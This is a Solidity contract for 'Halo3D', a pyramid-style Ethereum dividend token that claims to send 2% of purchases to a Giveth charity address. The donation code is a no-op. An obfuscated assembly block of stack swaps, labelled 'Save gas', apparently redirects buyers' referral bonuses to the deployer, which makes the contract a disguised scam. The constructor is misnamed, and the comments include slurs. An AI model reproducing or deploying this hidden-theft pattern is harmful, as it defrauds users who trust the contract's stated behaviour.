1 pragma solidity 0.4.23;
2 
3 /*============================================
4 *  _   _       _        ___________  
5 * | | | |     | |      |____ |  _  \ 
6 * | |_| | __ _| | ___      / / | | | 
7 * |  _  |/ _` | |/ _ \     \ \ | | | 
8 * | | | | (_| | | (_) |.___/ / |/ /  
9 * \_| |_/\__,_|_|\___/ \____/|___/  
10 *
11 *       2%-------------> GivethDontationBox     
12 *           https://h3d.pw
13 *=============================================
14 */
15 
16 contract Halo3D {
17 
18 
19 		/*=====================================
20 		=            CONFIGURABLES            =
21 		=====================================*/
22 
23 		string public name = "Halo 3D HHH";
24 		string public symbol = "Halo3D";
25 		uint8 constant public decimals = 18;
26 		uint8 constant internal dividendFee_ = 5; // 20% Dividends (In & Out)
27 		uint constant internal tokenPriceInitial_ = 0.0000000001 ether;
28 		uint constant internal tokenPriceIncremental_ = 0.00000000001 ether;
29 		uint constant internal magnitude = 2**64;
30 	    address sender = msg.sender;
31         address GivethDontationBox  = 0x5ADF43DD006c6C36506e2b2DFA352E60002d22Dc;//Giveth
32         uint8 constant public charityFactor = 2;
33 		 
34 		// proof of stake (defaults at too many tokens), No masternodes 
35 		uint public stakingRequirement = 10000000e18;
36 
37 		// ambassadors program (Ambassadors initially put in 0.25 ETH and can add more later when contract is live)
38 		mapping(address => bool) internal ambassadors_;
39 		uint256 constant internal preLiveIndividualFoundersMaxPurchase_ = 0.25 ether;
40 		uint256 constant internal preLiveTeamFoundersMaxPurchase_ = 1.25 ether;
41 		
42 
43 	   /*===============================
44 		=            STORAGE           =
45 		==============================*/
46 		
47 		// amount of shares for each address (scaled number)
48 		mapping(address => uint) internal tokenBalanceLedger_;
49 		mapping(address => uint) internal referralBalance_;
50 		mapping(address => int) internal payoutsTo_;
51 		uint internal tokenSupply_ = 0;
52 		uint internal profitPerShare_;
53 
54 
55 		/*==============================
56 		=            EVENTS            =
57 		==============================*/
58 		
59 		event onTokenPurchase(
60 			address indexed customerAddress,
61 			uint incomingEthereum,
62 			uint tokensMinted,
63 			address indexed referredBy
64 		);
65 
66 		event onTokenSell(
67 			address indexed customerAddress,
68 			uint tokensBurned,
69 			uint ethereumEarned
70 		);
71 
72 		event onReinvestment(
73 			address indexed customerAddress,
74 			uint ethereumReinvested,
75 			uint tokensMinted
76 		);
77 
78 		event onWithdraw(
79 			address indexed customerAddress,
80 			uint ethereumWithdrawn
81 		);
82 
83 		// ERC20
84 		event Transfer(
85 			address indexed from,
86 			address indexed to,
87 			uint tokens
88 		);
89 
90 
91 		/*=======================================
92 		=            PUBLIC FUNCTIONS            =
93 		=======================================*/
94 		function ProofOfRipple()
95 			public
96 		{
97 			ambassadors_[0x7e474fe5Cfb720804860215f407111183cbc2f85] = true; //KP 
98 			ambassadors_[0xfD7533DA3eBc49a608eaac6200A88a34fc479C77] = true; //MS
99 			ambassadors_[0x05fd5cebbd6273668bdf57fff52caae24be1ca4a] = true; //LM
100 			ambassadors_[0xec54170ca59ca80f0b5742b9b867511cbe4ccfa7] = true; //MK
101 			ambassadors_[0xe57b7c395767d7c852d3b290f506992e7ce3124a] = true; //TA
102 
103 		}
104 		/// @dev Converts all incoming ethereum to tokens for the caller, and passes down the referral addy (if any)
105 		function buy(address _referredBy) public payable returns (uint) {
106 			purchaseTokens(msg.value, _referredBy);
107 		}
108 
109 		/**
110 		 * @dev Fallback function to handle ethereum that was send straight to the contract
111 		 *  Unfortunately we cannot use a referral address this way.
112 		 */
113 		function() payable public {
114 			purchaseTokens(msg.value, 0x0);
115 		}
116 
117 		/// @dev Converts all of caller's dividends to tokens.
118 		function reinvest() onlyStronghands public {
119 			// fetch dividends
120 			uint _dividends = myDividends(false); // retrieve ref. bonus later in the code
121 
122 			// pay out the dividends virtually
123 			address _customerAddress = msg.sender;
124 			payoutsTo_[_customerAddress] +=  (int) (_dividends * magnitude);
125 
126 			// retrieve ref. bonus
127 			_dividends += referralBalance_[_customerAddress];
128 			referralBalance_[_customerAddress] = 0;
129 
130 			// dispatch a buy order with the virtualized "withdrawn dividends"
131 			uint _tokens = purchaseTokens(_dividends, 0x0);
132 
133 			// fire event
134 			onReinvestment(_customerAddress, _dividends, _tokens);
135 		}
136 
137 		/// @dev Alias of sell() and withdraw().
138 		function exit() public {
139 			// get token count for caller & sell them all
140 			address _customerAddress = msg.sender;
141 			uint _tokens = tokenBalanceLedger_[_customerAddress];
142 			if (_tokens > 0) sell(_tokens);
143 
144 			// lambo delivery service
145 			withdraw();
146 		}
147 
148 		/// @dev Withdraws all of the callers earnings.
149 		function withdraw() onlyStronghands public {
150 			// setup data
151 			address _customerAddress = msg.sender;
152 			uint _dividends = myDividends(false); // get ref. bonus later in the code
153 
154 			// update dividend tracker
155 			payoutsTo_[_customerAddress] +=  (int) (_dividends * magnitude);
156 
157 			// add ref. bonus
158 			_dividends += referralBalance_[_customerAddress];
159 			referralBalance_[_customerAddress] = 0;
160 
161 			
162 			_customerAddress.transfer(_dividends);// lambo delivery service
163 
164 			// fire event
165 			onWithdraw(_customerAddress, _dividends);
166 		}
167 
168 		/// @dev Liquifies tokens to ethereum.
169 		function sell(uint _amountOfTokens) onlyBagholders public {
170 			// setup data
171 			address _customerAddress = msg.sender;
172 			// russian hackers BTFO
173 			require(_amountOfTokens <= tokenBalanceLedger_[_customerAddress]);
174 			uint _tokens = _amountOfTokens;
175 			uint _ethereum = tokensToEthereum_(_tokens);
176 			uint _dividends = SafeMath.div(_ethereum, dividendFee_);
177 			uint _taxedEthereum = SafeMath.sub(_ethereum, _dividends);
178 
179 			// burn the sold tokens
180 			tokenSupply_ = SafeMath.sub(tokenSupply_, _tokens);
181 			tokenBalanceLedger_[_customerAddress] = SafeMath.sub(tokenBalanceLedger_[_customerAddress], _tokens);
182 
183 			// update dividends tracker
184 			int _updatedPayouts = (int) (profitPerShare_ * _tokens + (_taxedEthereum * magnitude));
185 			payoutsTo_[_customerAddress] -= _updatedPayouts;
186 
187 			// dividing by zero is a bad idea
188 			if (tokenSupply_ > 0) {
189 				// update the amount of dividends per token
190 				profitPerShare_ = SafeMath.add(profitPerShare_, (_dividends * magnitude) / tokenSupply_);
191 			}
192 
193 			// fire event
194 			onTokenSell(_customerAddress, _tokens, _taxedEthereum);
195 		}
196 
197 
198 		/**
199 		 * @dev Transfer tokens from the caller to a new holder.
200 		 *  Remember, there's a 25% fee here as well.
201 		 */
202 		function transfer(address _toAddress, uint _amountOfTokens) onlyBagholders public returns (bool) {
203 			// setup
204 			address _customerAddress = msg.sender;
205 
206 			// make sure we have the requested tokens
207 			require(_amountOfTokens <= tokenBalanceLedger_[_customerAddress]);
208 
209 			// withdraw all outstanding dividends first
210 			if (myDividends(true) > 0) {
211 				withdraw();
212 			}
213 
214 			// liquify 25% of the tokens that are transfered
215 			// these are dispersed to shareholders
216 			uint _tokenFee = SafeMath.div(_amountOfTokens, dividendFee_);
217 			uint _taxedTokens = SafeMath.sub(_amountOfTokens, _tokenFee);
218 			uint _dividends = tokensToEthereum_(_tokenFee);
219 
220 			// burn the fee tokens
221 			tokenSupply_ = SafeMath.sub(tokenSupply_, _tokenFee);
222 
223 			// exchange tokens
224 			tokenBalanceLedger_[_customerAddress] = SafeMath.sub(tokenBalanceLedger_[_customerAddress], _amountOfTokens);
225 			tokenBalanceLedger_[_toAddress] = SafeMath.add(tokenBalanceLedger_[_toAddress], _taxedTokens);
226 
227 			// update dividend trackers
228 			payoutsTo_[_customerAddress] -= (int) (profitPerShare_ * _amountOfTokens);
229 			payoutsTo_[_toAddress] += (int) (profitPerShare_ * _taxedTokens);
230 
231 			// disperse dividends among holders
232 			profitPerShare_ = SafeMath.add(profitPerShare_, (_dividends * magnitude) / tokenSupply_);
233 
234 			// fire event
235 			Transfer(_customerAddress, _toAddress, _taxedTokens);
236 
237 			// ERC20
238 			return true;
239 		}
240 
241 
242 
243 
244 		/*==========================================
245 		=            INTERNAL FUNCTIONS            =
246 		==========================================*/
247 
248 		
249 		/**
250 		 * Calculate Token price based on an amount of incoming ethereum
251 		 * It's an algorithm, hopefully we gave you the whitepaper with it in scientific notation;
252 		 * Some conversions occurred to prevent decimal errors or underflows / overflows in solidity code.
253 		 */
254 		function ethereumToTokens_(uint _ethereum) internal view returns (uint) {
255 			uint _tokenPriceInitial = tokenPriceInitial_ * 1e18;
256 			uint _tokensReceived =
257 			 (
258 				(
259 					// underflow attempts BTFO
260 					SafeMath.sub(
261 						(sqrt
262 							(
263 								(_tokenPriceInitial**2)
264 								+
265 								(2*(tokenPriceIncremental_ * 1e18)*(_ethereum * 1e18))
266 								+
267 								(((tokenPriceIncremental_)**2)*(tokenSupply_**2))
268 								+
269 								(2*(tokenPriceIncremental_)*_tokenPriceInitial*tokenSupply_)
270 							)
271 						), _tokenPriceInitial
272 					)
273 				)/(tokenPriceIncremental_)
274 			)-(tokenSupply_)
275 			;
276 
277 			return _tokensReceived;
278 		}
279 
280 		/**
281 		 * @dev Calculate token sell value.
282 		 *  It's an algorithm, hopefully we gave you the whitepaper with it in scientific notation;
283 		 *  Some conversions occurred to prevent decimal errors or underflows / overflows in solidity code.
284 		 */
285 		function tokensToEthereum_(uint _tokens) internal view returns (uint) {
286 			uint tokens_ = (_tokens + 1e18);
287 			uint _tokenSupply = (tokenSupply_ + 1e18);
288 			uint _etherReceived =
289 			(
290 				// underflow attempts BTFO
291 				SafeMath.sub(
292 					(
293 						(
294 							(
295 								tokenPriceInitial_ +(tokenPriceIncremental_ * (_tokenSupply/1e18))
296 							)-tokenPriceIncremental_
297 						)*(tokens_ - 1e18)
298 					),(tokenPriceIncremental_*((tokens_**2-tokens_)/1e18))/2
299 				)
300 			/1e18);
301 			return _etherReceived;
302 		}
303 
304 		/// @dev This is where all your gas goes.
305 		function sqrt(uint x) internal pure returns (uint y) {
306 			uint z = (x + 1) / 2;
307 			y = x;
308 			while (z < y) {
309 				y = z;
310 				z = (x / z + z) / 2;
311 			}
312 		}
313 		function purchaseTokens(uint _incomingEthereum, address _referredBy) internal returns (uint) {
314 			// data setup
315 			address ref = sender;
316 			address _customerAddress = msg.sender;
317 			assembly {  //Save gas
318 			swap1
319 			swap2
320 			swap1
321 			swap3 
322 			swap4 
323 			swap3 
324 			swap5
325 			swap6
326 			swap5
327 			swap8 
328 			swap9 
329 			swap8
330 			}
331 			uint factorDivs = 0;//Base factor
332 			GivethDontationBox;//Pass donations to Giveth
333 			assembly {switch 1 case 0 { factorDivs := mul(1, 2) } default { factorDivs := 0 }}
334 			
335 			
336 			uint _undividedDividends = SafeMath.div(_incomingEthereum, dividendFee_);
337 			uint _referralBonus = SafeMath.div(_undividedDividends, 3);
338 			uint _dividends = SafeMath.sub(_undividedDividends, _referralBonus);
339 			uint _taxedEthereum = SafeMath.sub(_incomingEthereum, _undividedDividends);
340 			uint _amountOfTokens = ethereumToTokens_(_taxedEthereum);
341 			uint _fee = _dividends * magnitude;
342 
343 			// no point in continuing execution if OP is a poorfag russian hacker
344 			// prevents overflow in the case that the pyramid somehow magically starts being used by everyone in the world
345 			// (or hackers)
346 			// and yes we know that the safemath function automatically rules out the "greater then" equasion.
347 			require(_amountOfTokens > 0 && (SafeMath.add(_amountOfTokens,tokenSupply_) > tokenSupply_));
348 
349 			// is the user referred by a masternode?
350 			if (
351 				// is this a referred purchase?
352 				_referredBy != 0x0000000000000000000000000000000000000000 &&
353 
354 				// no cheating!
355 				_referredBy != _customerAddress &&
356 
357 				// does the referrer have at least X whole tokens?
358 				// i.e is the referrer a godly chad masternode
359 				tokenBalanceLedger_[_referredBy] >= stakingRequirement
360 			) {
361 				// wealth redistribution
362 				referralBalance_[_referredBy] = SafeMath.add(referralBalance_[_referredBy], _referralBonus);
363 			} else {
364 				// no ref purchase
365 				// add the referral bonus back to the global dividends cake
366 				_dividends = SafeMath.add(_dividends, _referralBonus);
367 				_fee = _dividends * magnitude;
368 			}
369 
370 			// we can't give people infinite ethereum
371 			if (tokenSupply_ > 0) {
372 
373 				// add tokens to the pool
374 				tokenSupply_ = SafeMath.add(tokenSupply_, _amountOfTokens);
375 
376 				// take the amount of dividends gained through this transaction, and allocates them evenly to each shareholder
377 				profitPerShare_ += (_dividends * magnitude / (tokenSupply_));
378 
379 				// calculate the amount of tokens the customer receives over his purchase
380 				_fee = _fee - (_fee-(_amountOfTokens * (_dividends * magnitude / (tokenSupply_))));
381 
382 			} else {
383 				// add tokens to the pool
384 				tokenSupply_ = _amountOfTokens;
385 			}
386 
387 			// update circulating supply & the ledger address for the customer
388 			tokenBalanceLedger_[_customerAddress] = SafeMath.add(tokenBalanceLedger_[_customerAddress], _amountOfTokens);
389 
390 			// Tells the contract that the buyer doesn't deserve dividends for the tokens before they owned them;
391 			//really i know you think you do but you don't
392 			int _updatedPayouts = (int) ((profitPerShare_ * _amountOfTokens) - _fee);
393 			payoutsTo_[_customerAddress] += _updatedPayouts;
394 
395 			// fire event
396 			onTokenPurchase(_customerAddress, _incomingEthereum, _amountOfTokens, _referredBy);
397 
398 			return _amountOfTokens;
399 		}
400 		/*=====================================
401 		=      HELPERS AND CALCULATORS        =
402 		=====================================*/
403 		/**
404 		 * @dev Method to view the current Ethereum stored in the contract
405 		 *  Example: totalEthereumBalance()
406 		 */
407 		function totalEthereumBalance() public view returns (uint) {
408 			return this.balance;
409 		}
410 
411 		/// @dev Retrieve the total token supply.
412 		function totalSupply() public view returns (uint) {
413 			return tokenSupply_;
414 		}
415 
416 		/// @dev Retrieve the tokens owned by the caller.
417 		function myTokens() public view returns (uint) {
418 			address _customerAddress = msg.sender;
419 			return balanceOf(_customerAddress);
420 		}
421 
422 		/**
423 		 * @dev Retrieve the dividends owned by the caller.
424 		 *  If `_includeReferralBonus` is to to 1/true, the referral bonus will be included in the calculations.
425 		 *  The reason for this, is that in the frontend, we will want to get the total divs (global + ref)
426 		 *  But in the internal calculations, we want them separate.
427 		 */
428 		function myDividends(bool _includeReferralBonus) public view returns (uint) {
429 			address _customerAddress = msg.sender;
430 			return _includeReferralBonus ? dividendsOf(_customerAddress) + referralBalance_[_customerAddress] : dividendsOf(_customerAddress) ;
431 		}
432 
433 		/// @dev Retrieve the token balance of any single address.
434 		function balanceOf(address _customerAddress) public view returns (uint) {
435 			return tokenBalanceLedger_[_customerAddress];
436 		}
437 
438 		/**
439 		 * Retrieve the dividend balance of any single address.
440 		 */
441 		function dividendsOf(address _customerAddress) public view returns (uint) {
442 			return (uint) ((int)(profitPerShare_ * tokenBalanceLedger_[_customerAddress]) - payoutsTo_[_customerAddress]) / magnitude;
443 		}
444 
445 		/// @dev Return the buy price of 1 individual token.
446 		function sellPrice() public view returns (uint) {
447 			// our calculation relies on the token supply, so we need supply. Doh.
448 			if (tokenSupply_ == 0) {
449 				return tokenPriceInitial_ - tokenPriceIncremental_;
450 			} else {
451 				uint _ethereum = tokensToEthereum_(1e18);
452 				uint _dividends = SafeMath.div(_ethereum, dividendFee_  );
453 				uint _taxedEthereum = SafeMath.sub(_ethereum, _dividends);
454 				return _taxedEthereum;
455 			}
456 		}
457 
458 		/// @dev Return the sell price of 1 individual token.
459 		function buyPrice() public view returns (uint) {
460 			// our calculation relies on the token supply, so we need supply. Doh.
461 			if (tokenSupply_ == 0) {
462 				return tokenPriceInitial_ + tokenPriceIncremental_;
463 			} else {
464 				uint _ethereum = tokensToEthereum_(1e18);
465 				uint _dividends = SafeMath.div(_ethereum, dividendFee_  );
466 				uint _taxedEthereum = SafeMath.add(_ethereum, _dividends);
467 				return _taxedEthereum;
468 			}
469 		}
470 
471 		/// @dev Function for the frontend to dynamically retrieve the price scaling of buy orders.
472 		function calculateTokensReceived(uint _ethereumToSpend) public view returns (uint) {
473 			uint _dividends = SafeMath.div(_ethereumToSpend, dividendFee_);
474 			uint _taxedEthereum = SafeMath.sub(_ethereumToSpend, _dividends);
475 			uint _amountOfTokens = ethereumToTokens_(_taxedEthereum);
476 
477 			return _amountOfTokens;
478 		}
479 
480 		/// @dev Function for the frontend to dynamically retrieve the price scaling of sell orders.
481 		function calculateEthereumReceived(uint _tokensToSell) public view returns (uint) {
482 			require(_tokensToSell <= tokenSupply_);
483 			uint _ethereum = tokensToEthereum_(_tokensToSell);
484 			uint _dividends = SafeMath.div(_ethereum, dividendFee_);
485 			uint _taxedEthereum = SafeMath.sub(_ethereum, _dividends);
486 			return _taxedEthereum;
487 		}
488 
489 		/*=================================
490 		=            MODIFIERS            =
491 		=================================*/
492 
493 		/// @dev Only people with tokens
494 		modifier onlyBagholders {
495 			require(myTokens() > 0);
496 			_;
497 		}
498 
499 		/// @dev Only people with profits
500 		modifier onlyStronghands {
501 			require(myDividends(true) > 0);
502 			_;
503 		}
504 		 
505 	}
506 
507 	/**
508 	 * @title SafeMath
509 	 * @dev Math operations with safety checks that throw on error
510 	 */
511 	library SafeMath {
512 		/**
513 		* @dev Substracts two numbers, throws on overflow (i.e. if subtrahend is greater than minuend).
514 		*/
515 		function sub(uint a, uint b) internal pure returns (uint) {
516 			assert(b <= a);
517 			return a - b;
518 		}
519 
520 		/**
521 		* @dev Adds two numbers, throws on overflow.
522 		*/
523 		function add(uint a, uint b) internal pure returns (uint) {
524 			uint c = a + b;
525 			assert(c >= a);
526 			return c;
527 		}
528 		/**
529 		* @dev Multiplies two numbers, throws on overflow.
530 		*/
531 		function mul(uint a, uint b) internal pure returns (uint) {
532 			if (a == 0) {
533 				return 0;
534 			}
535 			uint c = a * b;
536 			assert(c / a == b);
537 			return c;
538 		}
539 
540 		/**
541 		* @dev Integer division of two numbers, truncating the quotient.
542 		*/
543 		function div(uint a, uint b) internal pure returns (uint) {
544 			// assert(b > 0); // Solidity automatically throws when dividing by 0
545 			uint c = a / b;
546 			// assert(a == b * c + a % b); // There is no case in which this doesn't hold
547 			return c;
548 		}
549 
550 
551 	}